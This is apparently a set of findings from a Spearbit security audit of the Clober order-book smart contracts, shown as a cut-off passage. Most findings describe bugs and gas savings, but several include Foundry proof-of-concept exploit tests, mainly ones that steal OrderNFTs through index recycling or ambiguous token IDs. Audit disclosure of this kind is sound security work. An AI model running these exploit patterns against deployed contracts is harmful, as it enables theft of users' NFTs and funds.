"Overflow in SegmentedSegmentTree464", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "SegmentedSegmentTree464.update needs to perform an overflow check in case the new value is greater than the old value. This overflow check is done when adding the new difference to each node in each layer (using addClean). Furthermore, there's a final overflow check by adding up all nodes in the first layer in total(core). However, in total, the nodes in individual groups are added using DirtyUint64.sumPackedUnsafe: function total(Core storage core) internal view returns (uint64) { return DirtyUint64.sumPackedUnsafe(core.layers[0][0], 0, _C) + DirtyUint64.sumPackedUnsafe(core.layers[0][1], 0, _C); } The nodes in a group can overflow without triggering an overflow & revert. The impact is that the order book depth and claim functionalities break for all users. 6 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"forge-std/StdJson.sol\"; import \"../../contracts/mocks/SegmentedSegmentTree464Wrapper.sol\"; contract SegmentedSegmentTree464Test is Test { using stdJson for string; uint32 private constant _MAX_ORDER = 2**15; SegmentedSegmentTree464Wrapper testWrapper; function setUp() public { testWrapper = new SegmentedSegmentTree464Wrapper(); } function testTotalOverflow() public { uint64 half64 = type(uint64).max / 2 + 1; testWrapper.update(0, half64); // map to the right node of layer 0, group 0 testWrapper.update(_MAX_ORDER / 2 - 1, half64); assertEq(testWrapper.total(), 0); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to controlling future and past tokens of same order index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order queue is implemented as a ring buffer, to get an order (Orderbook.getOrder) the index in the queue is computed as orderIndex % _MAX_ORDER. The owner of an OrderNFT also uses this function. function _getOrder(OrderKey calldata orderKey) internal view returns (Order storage) { return _getQueue(orderKey.isBid, orderKey.priceIndex).orders[orderKey.orderIndex & _MAX_ORDER_M]; } CloberOrderBook(market).getOrder(decodeId(tokenId)).owner Therefore, the current owner of the NFT of orderIndex also owns all NFTs with orderIndex + k * _MAX_ORDER. An attacker can set approvals of future token IDs to themself. These approvals are not cleared on OrderNFT.onMint when a victim mints this future token ID, allowing the attacker to steal the NFT and cancel the NFT to claim their tokens. 7 // SPDX-License-Identifier: BUSL-1.1 pragma solidity ^0.8.0; import \"forge-std/Test.sol\"; import \"../../../../contracts/interfaces/CloberMarketSwapCallbackReceiver.sol\"; import \"../../../../contracts/mocks/MockQuoteToken.sol\"; import \"../../../../contracts/mocks/MockBaseToken.sol\"; import \"../../../../contracts/mocks/MockOrderBook.sol\"; import \"../../../../contracts/markets/VolatileMarket.sol\"; import \"../../../../contracts/OrderNFT.sol\"; import \"../utils/MockingFactoryTest.sol\"; import \"./Constants.sol\"; contract ExploitsTest is Test, CloberMarketSwapCallbackReceiver, MockingFactoryTest { struct Return { address tokenIn; address tokenOut; uint256 amountIn; uint256 amountOut; uint256 refundBounty; } struct Vars { uint256 inputAmount; uint256 outputAmount; uint256 beforePayerQuoteBalance; uint256 beforePayerBaseBalance; uint256 beforeTakerQuoteBalance; uint256 beforeOrderBookEthBalance; } MockQuoteToken quoteToken; MockBaseToken baseToken; MockOrderBook orderBook; OrderNFT orderToken; function setUp() public { quoteToken = new MockQuoteToken(); baseToken = new MockBaseToken(); } function cloberMarketSwapCallback( address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut, bytes calldata data ) external payable { if (data.length != 0) { Return memory expectedReturn = abi.decode(data, (Return)); assertEq(tokenIn, expectedReturn.tokenIn, \"ERROR_TOKEN_IN\"); assertEq(tokenOut, expectedReturn.tokenOut, \"ERROR_TOKEN_OUT\"); assertEq(amountIn, expectedReturn.amountIn, \"ERROR_AMOUNT_IN\"); assertEq(amountOut, expectedReturn.amountOut, \"ERROR_AMOUNT_OUT\"); assertEq(msg.value, expectedReturn.refundBounty, \"ERROR_REFUND_BOUNTY\"); } IERC20(tokenIn).transfer(msg.sender, amountIn); } 8 function _createOrderBook(int24 makerFee, uint24 takerFee) private { orderToken = new OrderNFT(); orderBook = new MockOrderBook( address(orderToken), address(quoteToken), address(baseToken), 1, 10**4, makerFee, takerFee, address(this) ); orderToken.init(\"\", \"\", address(orderBook), address(this)); uint256 _quotePrecision = 10**quoteToken.decimals(); quoteToken.mint(address(this), 1000000000 * _quotePrecision); quoteToken.approve(address(orderBook), type(uint256).max); uint256 _basePrecision = 10**baseToken.decimals(); baseToken.mint(address(this), 1000000000 * _basePrecision); baseToken.approve(address(orderBook), type(uint256).max); } function _buildLimitOrderOptions(bool isBid, bool postOnly) private pure returns (uint8) { return (isBid ? 1 : 0) + (postOnly ? 2 : 0); } uint256 private constant _MAX_ORDER = 2**15; // 32768 uint256 private constant _MAX_ORDER_M = 2**15 - 1; // % 32768 function testExploit2() public { _createOrderBook(0, 0); address attacker = address(0x1337); address attacker2 = address(0x1338); address victim = address(0xbabe); // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 1e18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ,! ambiguous tokenIds CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); uint256 currentTokenId = orderToken.encodeId(orderKey); orderKey.orderIndex += _MAX_ORDER; uint256 futureTokenId = orderToken.encodeId(orderKey); // Step 3. Attacker approves the futureTokenId to themself, and cancels the current id vm.startPrank(attacker); orderToken.approve(attacker2, futureTokenId); CloberOrderBook.OrderKey[] memory orderKeys = new CloberOrderBook.OrderKey[](1); orderKeys[0] = orderKey; orderKeys[0].orderIndex = orderIndex; // restore original orderIndex 9 orderBook.cancel(attacker, orderKeys); vm.stopPrank(); // Step 4. attacker fills queue, victim creates their order recycles orderIndex 0 uint256 victimOrderSize = 1e18; for(uint256 i = 0; i < _MAX_ORDER; i++) { orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: i < _MAX_ORDER - 1 ? attacker : victim, priceIndex: priceIndex, rawAmount: 0, baseAmount: victimOrderSize, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); } assertEq(orderToken.ownerOf(futureTokenId), victim); // Step 5. Attacker steals the NFT and can cancel to receive the tokens vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker, futureTokenId); vm.stopPrank(); assertEq(orderToken.ownerOf(futureTokenId), attacker); uint256 baseBalanceBefore = baseToken.balanceOf(attacker); vm.startPrank(attacker); orderKeys[0].orderIndex = orderIndex + _MAX_ORDER; orderBook.cancel(attacker, orderKeys); vm.stopPrank(); assertEq(baseToken.balanceOf(attacker) - baseBalanceBefore, victimOrderSize); } }", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "OrderNFT theft due to ambiguous tokenId encoding/decoding scheme", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The encodeId() uniquely encodes OrderKey to a uin256 number. However, decodeId() ambigu- ously can decode many tokenId's to the exact same OrderKey. This can be problematic due to the fact that contract uses tokenId's to store approvals. The ambiguity comes from converting uint8 value to bool isBid value here function decodeId(uint256 id) public pure returns (CloberOrderBook.OrderKey memory) { uint8 isBid; uint16 priceIndex; uint232 orderIndex; assembly { orderIndex := id priceIndex := shr(232, id) isBid := shr(248, id) } return CloberOrderBook.OrderKey({isBid: isBid == 1, priceIndex: priceIndex, orderIndex: orderIndex}); ,! } (note that the attack is possible only for ASK limit orders) 11 Proof of Concept // Step 1. Attacker creates an ASK limit order and receives NFT uint16 priceIndex = 100; uint256 orderIndex = orderBook.limitOrder{value: Constants.CLAIM_BOUNTY * 1 gwei}({ user: attacker, priceIndex: priceIndex, rawAmount: 0, baseAmount: 10**18, options: _buildLimitOrderOptions(Constants.ASK, Constants.POST_ONLY), data: new bytes(0) }); // Step 2. Given the `OrderKey` which represents the created limit order, an attacker can craft ambiguous tokenIds ,! CloberOrderBook.OrderKey memory order_key = CloberOrderBook.OrderKey({isBid: false, priceIndex: priceIndex, orderIndex: orderIndex}); ,! uint256 tokenId = orderToken.encodeId(order_key); uint256 ambiguous_tokenId = tokenId + (1 << 255); // crafting ambiguous tokenId // Step 3. Attacker approves both victim (can be a third-party protocol like OpenSea) and his other account ,! vm.startPrank(attacker); orderToken.approve(victim, tokenId); orderToken.approve(attacker2, ambiguous_tokenId); vm.stopPrank(); // Step 4. Victim transfers the NFT to the themselves. (Or attacker trades it) vm.startPrank(victim); orderToken.transferFrom(attacker, victim, tokenId); vm.stopPrank(); // Step 5. Attacker steals the NFT vm.startPrank(attacker2); orderToken.transferFrom(victim, attacker2, ambiguous_tokenId); vm.stopPrank();", "labels": ["Spearbit", "Clober", "Severity: Critical Risk"]}, {"title": "Missing owner check on from when transferring tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT.transferFrom/safeTransferFrom use the internal _transfer function. While they check approvals on msg.sender through _isApprovedOrOwner(msg.sender, tokenId), it is never checked that the specified from parameter is actually the owner of the NFT. An attacker can decrease other users' NFT balances, making them unable to cancel or claim their NFTs and locking users' funds. The attacker transfers their own NFT passing the victim as from by calling transfer- From(from=victim, to=attackerAccount, tokenId=attackerTokenId). This passes the _isApprovedOrOwner check, but reduces from's balance.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong minimum net fee check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "A minimum net fee was introduced that all markets should comply by such that the protocol earns fees. The protocol fees are computed takerFee + makerFee and the market factory computes the wrong check. Fee pairs that should be accepted are currently not accepted, and even worse, fee pairs that should be rejected are currently accepted. Market creators can avoid collecting protocol fees this way.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Rounding up of taker fees of constituent orders may exceed collected fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "If multiple orders are taken, the taker fee calculated is rounded up once, but that of each taken maker order could be rounded up as well, leading to more fees accounted for than actually taken. Example:  takerFee = 100011 (10.0011%)  2 maker orders of amounts 400000 and 377000  total amount = 400000 + 377000 = 777000  Taker fee taken = 777000 * 100011 / 1000000 = 77708.547 = 777709 Maker fees would be 13 377000 * 100011 / 1000000 = 37704.147 = 37705 400000 * 100011 / 1000000 = 40004.4 = 40005 which is 1 wei more than actually taken. Below is a foundry test to reproduce the problem, which can be inserted into Claim.t.sol: function testClaimFeesFailFromRounding() public { _createOrderBook(0, 100011); // 10.0011% taker fee // create 2 orders uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); uint256 orderIndex2 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); // take both orders _createTakeOrder(Constants.BID, 2 * Constants.RAW_AMOUNT); CloberOrderBook.OrderKey[] memory ids = new CloberOrderBook.OrderKey[](2); ids[0] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); ids[1] = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex2 }); // perform claim orderBook.claim( address(this), ids ); // (uint128 quoteFeeBal, uint128 baseFeeBal) = orderBook.getFeeBalance(); // console.log(quoteFeeBal); // fee accounted = 20004 // console.log(baseFeeBal); // fee accounted = 0 // console.log(quoteToken.balanceOf(address(orderBook))); // actual fee collected = 20003 // try to claim fees, will revert vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); orderBook.collectFees(); }", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Drain tokens condition due to reentrancy in collectFees", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "collectFees function is not guarded by a re-entrancy guard. In case a transfer of at least one of the tokens in a trading pair allows to invoke arbitrary code (e.g. token implementing callbacks/hooks), it is possible for a malicious host to drain trading pools. The re-entrancy condition allows to transfer collected fees multiple times to both DAO and the host beyond the actual fee counter.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Group claim clashing condition", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Claim functionality is designed to support 3rd party operators to claim multiple orders on behalf of market's users to finalise the transactions, deliver assets and earn bounties. The code allows to iterate over a list of orders to execute _claim. function claim(address claimer, OrderKey[] calldata orderKeys) external nonReentrant revertOnDelegateCall { uint32 totalBounty = 0; for (uint256 i = 0; i < orderKeys.length; i++) { ... (uint256 claimedTokenAmount, uint256 minusFee, uint64 claimedRawAmount) = _claim( queue, mOrder, orderKey, claimer ); ... } } However, neither claim nor _claim functions in OrderBook support skipping already fulfilled orders. On the con- trary in case of a revert in _claim the whole transaction is reverted. function _claim(...) private returns (...) { ... require(mOrder.openOrderAmount > 0, Errors.OB_INVALID_CLAIM); ... } Such implementation does not support fully the initial idea of 3rd party operators claiming orders in batches. A transaction claiming multiple orders at once can easily clash with others and be reverted completely, effectively claiming nothing - just wasting gas. Clashing can happen for instance when two bots got overlapping lists of orders or when the owner of the order decides to claim or cancel his/her order manually while the bot is about to claim it as well. 15", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Order owner isn't zeroed after burning", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The order's owner is not zeroed out when the NFT is burnt. As a result, while the onBurn() method records the NFT to have been transferred to the zero address, ownerOf() still returns the current order's owner. This allows for unexpected behaviour, like being able to call approve() and safeTransferFrom() functions on non-existent tokens. A malicious actor could sell such resurrected NFTs on secondary exchanges for profit even though they have no monetary value. Such NFTs will revert on cancellation or claim attempts since openOrderAmount is zero. function testNFTMovementAfterBurn() public { _createOrderBook(0, 0); address attacker2 = address(0x1337); // Step 1: make 2 orders to avoid bal sub overflow when moving burnt NFT in step 3 uint256 orderIndex1 = _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); _createPostOnlyOrder(Constants.BID, Constants.RAW_AMOUNT); CloberOrderBook.OrderKey memory orderKey = CloberOrderBook.OrderKey({ isBid: Constants.BID, priceIndex: Constants.PRICE_INDEX, orderIndex: orderIndex1 }); uint256 tokenId = orderToken.encodeId(orderKey); // Step 2: burn 1 NFT by cancelling one of the orders vm.startPrank(Constants.MAKER); orderBook.cancel( Constants.MAKER, _toArray(orderKey) ); // verify ownership is still maker assertEq(orderToken.ownerOf(tokenId), Constants.MAKER, \"NFT_OWNER\"); // Step 3: resurrect burnt token by calling safeTransferFrom orderToken.safeTransferFrom( Constants.MAKER, attacker2, tokenId ); // verify ownership is now attacker2 assertEq(orderToken.ownerOf(tokenId), attacker2, \"NFT_OWNER\"); }", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Lack of two-step role transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The contracts lack two-step role transfer. Both the ownership of the MarketFactory as well as the change of market's host are implemented as single-step functions. The basic validation whether the address is not a zero address for a market is performed, however the case when the address receiving the role is inaccessible is not covered properly. Taking into account the handOverHost can be invoked without any supervision, by anyone who created the market it is possible to make a typo unintentionally or intentionally if the attacker wants simply to brick fees collection as currently the host affects collectFees in OrderBook (described as a separate issue). The ownership transfer in theory should be less error-prone as it should be done by DAO with great care, however still two-step role transfer should be preferable.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "Atomic fees delivery susceptible to funds lockout", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function delivers the quoteToken part of fees as well as the baseToken part of fees atomically and simultaneously to both the DAO and the host. In case a single address is for instance blacklisted (e.g. via USDC blacklist feature) or a token in a pair happens to be malicious and configured the way transfer to one of the addresses reverts it is possible to block fees delivery. 17 function collectFees() external nonReentrant { // @audit delivers both tokens atomically require(msg.sender == _host(), Errors.ACCESS); if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } function _collectFees(IERC20 token, uint256 amount) internal { // @audit delivers to both wallets uint256 daoFeeAmount = (amount * _DAO_FEE) / _FEE_PRECISION; uint256 hostFeeAmount = amount - daoFeeAmount; _transferToken(token, _daoTreasury(), daoFeeAmount); _transferToken(token, _host(), hostFeeAmount); } There are multiple cases when such situation can happen for instance: a malicious host wants to block the function for DAO to prevent collecting at least guaranteed valuable quoteToken or a hacked DAO can swap treasury to some invalid address and renounce ownership to brick collectFees across multiple markets. Taking into account the current implementation in case it is not possible to transfer tokens it is necessary to swap the problematic address, however depending on the specific case it might be not trivial.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "DAO fees potentially unavailable due to overly strict access control", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The collectFees function is guarded by an inline access control require statement condition which prevents anyone, except a host, from invoking the function. Only the host of the market is authorized to invoke, effectively deliver all collected fees, including the part of the fees belonging to the DAO. function collectFees() external nonReentrant { require(msg.sender == _host(), Errors.ACCESS); // @audit only host authorized if (_baseFeeBalance > 1) { _collectFees(_baseToken, _baseFeeBalance - 1); _baseFeeBalance = 1; } if (_quoteFeeBalance > 1) { _collectFees(_quoteToken, _quoteFeeBalance - 1); _quoteFeeBalance = 1; } } This access control is too strict and can lead to funds being locked permanently in the worst case scenario. As the host is a single point of failure in case access to the wallet is lost or is incorrectly transferred the fees for both the host and the DAO will be locked.", "labels": ["Spearbit", "Clober", "Severity: Medium Risk"]}, {"title": "OrderNFT ownership and market host transfers are done separately", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The market host is entitled to 80% of the fees collected, and is able to set the URI of the correspond- ing orderToken NFT. However, transferring the market host and the orderToken NFT is done separately. It is thus possible for a market host to transfer one but not the other.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "OrderNFTs can be renamed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OrderNFT contract's name and symbol can be changed at any time by the market host. Usually, these fields are immutable for ERC721 NFTs. There might be potential issues with off-chain indexers that cache only the original value. Furthermore, suddenly renaming tokens by a malicious market host could lead to web2 phishing attacks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "DOSing _replaceStaleOrder() due to reverting on token transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case of tokens with implemented hooks, a malicious order owner can revert on token received event thus cause a denial-of-service via _replaceStaleOrder(). The probability of such an attack is very low, because the order queue has to be full and it is unusual for tokens to implement hooks.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Total claimable bounties may exceed type(uint32).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Individual bounties are capped to type(uint32).max which is ~4.295 of a native token of 18 decimals (4.2949673e18 wei). It's possible (and likely in the case of Polygon network) for their sum to therefore exceed type(uint32).max.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Can fake market order in TakeOrder event", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Market orders in Orderbook.marketOrder set the 8-th bit of options. This options value is later used in _take's TakeOrder event. However, one can call Orderbook.limitOrder with this 8-th bit set and spoof a market order event.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "_priceToIndex will revert if price is type(uint128).max", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Because price is type uint128, the increment will overflow first before it is casted to uint256 uint256 shiftedPrice = uint256(price + 1) << 64;", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "using block.chainid for create2 salt can be problematic if there's chain hardfork", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Using block.chainid as salt for create2 can result in inconsistency if there is a chain split event(eg. eth2 merge). This will make 2 different chains that has different chainid(one with original chain id and one with random new value). Which will result in making one of the chains not able to interact with markets, nfts properly. Also, it will make things hard to do a fork testing which changes chainid for local environment.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}, {"title": "Use get64Unsafe() when updating claimable in take()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "get64Unsafe() can be used when fetching the stored claimable value since _getClaimableIndex() returns elementIndex < 4", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Check is zero is cheaper than check if the result is a concrete value", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Checking if the result is zero vs. checking if the result is/isn't a concrete value should save 1 opcode.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Function argument can be skipped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The address caller parameter in the internal _cancel function can be replaced with msg.sender as effectively this is the value that is actually used when the function is invoked.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant flash loan balance cap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The requested flash loan amounts are checked against and capped up to the contract's token bal- ances, so the caller has to validate and handle the case where the tokens received are below the requested amounts. It would be better to optimize for the success case where there are sufficient tokens. Otherwise, let the function revert from failure to transfer the requested tokens instead.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Do direct assignment to totalBaseAmount and totalQuoteAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "While iterating through multiple claims, totalBaseAmount and totalQuoteAmount are reset and as- signed a value each iteration. Since they are only incremented in the referenced block (and are mutually exclusive cases), the assignment can be direct instead of doing an increment.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Redundant zero minusFee setter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "minusFee defaults to zero, so the explicit setting of it is redundant.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Load _FEE_PRECISION into local variable before usage", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Loading _FEE_PRECISION into a local variable slightly reduced bytecode size (0.017kB) and was found to be a tad more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Can cache value difference in SegmentedSegmentTree464.update", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The replaced - value expression in SegmentedSegmentTree464.pop is recomputed several times in each loop iteration.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unnecessary loop condition in pop", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The loop variable l in SegmentedSegmentTree464.pop is an unsigned int, so the loop condition l >= 0 is always true. The reason why it still terminates is that the first layer only has group index 0 and 1, so the rightIndex.group - leftIndex.group < 4 condition is always true when the first layer is reached, and then it terminates with the break keyword.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Use same comparisons for children in heap", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The pop function compares one child with a strict inequality (<) and the other with less than or equals (<=). A heap doesn't guarantee order between the children and there are no duplicate nodes (wordIndexes).", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "No need for explicit assignment with default values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Explicitly assigning ZERO value (or any default value) costs gas, but is not needed.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Prefix increment is more efficient than postfix increment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The prefix increment reduces bytecode size by a little, and is slightly more gas efficient.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Tree update can be avoided for fully filled orders", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For fully filled orders, remainingAmount will be 0 (openOrderAmount == claimedRawAmount), so the tree update can be skipped since the new value is the same as the old value. Hence, the code block can be moved inside the if (remainingAmount > 0) code block.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Shift msg.value cap check for earlier revert", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The cap check on msg.value should be shifted up to the top of the function so that failed checks will revert earlier, saving gas in these cases.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Solmate's ReentrancyGuard is more efficient than OpenZeppelin's", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "Solmate's ReentrancyGuard provides the same functionality as OpenZeppelin's version, but is more efficient as it reduces the bytecode size by 0.11kB, which can be further reduced if its require statement is modified to revert with a custom error.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "r * r is more gas efficient than r ** 2", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "It's more gas efficient to do r * r instead of r ** 2, saving on deployment cost.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Update childHeapIndex and shifter initial values to constants", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The initial values of childHeapIndex and shifter can be better hardcoded to avoid redundant operations.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Same value tree update falls under else case which will do redundant overflow check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "In the case where value and replaced are equal, it currently will fall under the else case which has an addition overflow check that isn't required in this scenario. In fact, the tree does not need to be updated at all.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unchecked code blocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The mentioned code blocks can be performed without native math overflow / underflow checks because they have been checked to be so, or the min / max range ensures it.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Unused Custom Error", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "error TreeQueryIndexOrder(); is defined but unused.", "labels": ["Spearbit", "Clober", "Severity: Gas Optimization"]}, {"title": "Markets with malicious tokens should not be interacted with", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The Clober protocol is permissionless and allows anyone to create an orderbook for any base token. These base tokens can be malicious and interacting with these markets can lead to loss of funds in several ways. For example, a token with custom code / a callback to an arbitrary address on transfer can use the pending ETH that the victim supplied to the router and trade it for another coin. The victim will lose their ETH and then be charged a second time using their WETH approval of the router.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Claim bounty of stale orders should be given to user instead of daoTreasury", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When an unclaimed stale order is being replaced, the claimBounty is sent to the DAO treasury. However, since the user is the one executing the claim on behalf of the stale order owner, and is paying the gas for it, the claimBounty should be sent to him instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Misleading comment on remainingRequestedRawAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The comment says // always ceil, but remainingRequestedRawAmount is rounded down when the base / quote amounts are converted to the raw amount.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Potential DoS if quoteUnit and index to price functions are set to unreasonable values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "There are some griefing and DoS (denial-of-service) attacks for some markets that are created with bad quoteUnit and pricing functions. 1. A market order uses _take to iterate over several price indices until the order is filled. An attacker can add a tiny amount of depth to many indices (prices), increasing the gas cost and in the worst case leading to out-of-gas transactions. 2. There can only be MAX_ORDER_SIZE (32768) different orders at a single price (index). Old orders are only replaced if the previous order at the index has been fully filled. A griefer or a market maker trying to block their competition can fill the entire order queue for a price. This requires 32768 * quoteUnit quote tokens.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rounding rationale could be better clarified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The rationale for rounding up / down was easier to follow if tied to the expendInput option instead.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Rename flashLoan() for better composability & ease of integration", "html_url": 